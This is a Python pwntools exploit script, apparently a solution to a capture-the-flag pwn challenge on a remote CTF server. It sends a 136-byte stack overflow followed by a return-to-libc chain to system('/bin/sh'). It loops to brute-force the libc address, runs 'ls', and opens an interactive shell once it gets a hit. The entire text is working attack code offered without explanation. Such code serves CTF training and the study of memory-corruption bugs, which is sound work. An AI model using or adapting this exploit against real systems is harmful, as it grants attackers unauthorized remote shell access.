from pwn import*
from time import sleep
res =''
while 1:
	p = remote('chall.csivit.com', 30046)
	#p= process('./hello')
	padd = "a" * 136
	system = p32(0xf7e0f950)
	bin_sh = p32(0x11e7bb + 0xf7e0f950)
	#main  = p32(0x0804865d)

	payload	=''
	payload += padd
	payload += system
	payload += "AAAA"
	payload += bin_sh
	p.sendlineafter('your name?\n',payload)
	p.sendline('ls')
	p.recvline()
	sleep(.2)
	try:
		a = p.recvline()
		print 'test: ',a
		
		if 'ctf' in a:
			p.interactive()
			
	except EOFError:
		p.close()
		p.shutdown()	

